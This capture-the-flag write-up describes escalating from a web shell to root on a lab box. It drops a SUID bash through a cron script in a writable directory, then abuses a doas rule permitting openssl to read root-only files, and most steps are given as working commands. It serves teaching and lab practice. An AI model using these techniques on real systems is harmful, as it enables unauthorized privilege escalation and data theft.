# Daemon Slayer – Part 2 - Cron Privilege Escalation, SUID Access and Doas Misconfiguration

## 1. Initial Access

The objective of Part 2 was to retrieve:

```bash
/root/root.txt
```

A new challenge container was started with:

```bash
10.10.0.27
```

The previously discovered Web exploitation path was reused:

```text
muzan / admin123
        ↓
Authenticated file upload
        ↓
PHP Web shell
        ↓
www-data
```

Remote command execution was confirmed:

```bash
curl 'http://10.10.0.27:445/upper/uploads/1788360120_cmd.php?cmd=id'
```

Result:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



## 2. Cron Privilege Escalation to Muzan

The system crontab was inspected:

```bash
cat /etc/crontab
```

A custom cron job was identified:

```bash
* * * * * muzan /var/www/scripts/immortality_check.sh
```

Permissions:

```bash
drwxr-xr-x www-data www-data /var/www/scripts

-rwxr-xr-x muzan muzan /var/www/scripts/immortality_check.sh
```

The script itself was not writable by `www-data`, but its parent directory was.

The original script was replaced with:

```bash
#!/bin/sh
cp /bin/bash /tmp/muzanbash
chmod 4755 /tmp/muzanbash
```

After cron executed it, the new binary had:

```bash
-rwsr-xr-x 1 muzan muzan /tmp/muzanbash
```

The SUID bit allowed Bash to execute with `muzan` as its effective user:

```bash
/tmp/muzanbash -p -c 'id'
```

Result:

```bash
uid=33(www-data) gid=33(www-data) euid=1000(muzan)
```



## 3. Obtaining a Real Muzan UID

The real UID was still `www-data`, so Python was used to replace it with the effective UID:

```python
import os
os.setreuid(os.geteuid(), os.geteuid())
```

Result:

```bash
uid=1000(muzan) gid=33(www-data)
```

This provided a process operating as the local user `muzan`.



## 4. Local Privilege Escalation Enumeration

`sudo` permissions were tested:

```bash
sudo -n -l
```

Result:

```bash
sudo: a password is required
```

The previously discovered Web password `admin123` was also tested but was not valid as the Linux password.

SUID binaries were then enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Interesting results included:

```bash
/usr/bin/doas
/usr/sbin/exim4
```

Linux capabilities were checked:

```bash
getcap -r / 2>/dev/null
```

No capabilities were found.



## 5. Doas Misconfiguration

The `doas` configuration was inspected:

```bash
cat /etc/doas.conf
```

Result:

```bash
permit nopass muzan as root cmd openssl
```

This rule means:

```text
muzan
   ↓
may execute openssl
   ↓
as root
   ↓
without a password
```

Although only `openssl` was authorized, its arguments were unrestricted.



## 6. Reading root.txt with OpenSSL

OpenSSL can read files through its Base64 functionality.

It was executed through `doas`:

```bash
doas -n openssl base64 -A -in /root/root.txt
```

Parameters:

* `doas -n`: executes without requesting a password.
* `openssl`: command explicitly allowed by `doas.conf`.
* `base64`: reads and encodes input data.
* `-A`: outputs Base64 on one line.
* `-in /root/root.txt`: reads the protected root flag.

Result:

```bash
RVBJezFfdzFsbF9ubzdfN1JhbXBsM19vbl83aDNfUGExTjVfb2ZfQjMxbjlfQV9kM21vbn0K
```

The value was decoded locally:

```bash
echo 'RVBJezFfdzFsbF9ubzdfN1JhbXBsM19vbl83aDNfUGExTjVfb2ZfQjMxbjlfQV9kM21vbn0K' | base64 -d
```



## 7. Root Flag

Flag:

```bash
EPI{1_w1ll_no7_7Rampl3_on_7h3_Pa1N5_of_B31n9_A_d3mon}
```



## Attack Path Summary

```text
www-data
        ↓
Writable cron script directory
        ↓
Cron executes as muzan
        ↓
SUID Bash created
        ↓
muzan
        ↓
SUID enumeration
        ↓
/usr/bin/doas
        ↓
/etc/doas.conf
        ↓
permit nopass muzan as root cmd openssl
        ↓
OpenSSL executed as root
        ↓
/root/root.txt read through OpenSSL
        ↓
Base64 decoded
        ↓
Root flag retrieved
```

## Main Security Issues Identified

1. Writable directory containing a script executed by another user through cron.
2. Cron job allowed privilege escalation from `www-data` to `muzan`.
3. `doas` permitted `muzan` to execute OpenSSL as `root` without a password.
4. OpenSSL arguments were unrestricted, allowing arbitrary root-owned files to be read.
5. The combination of cron and `doas` misconfigurations resulted in access to `/root/root.txt`.
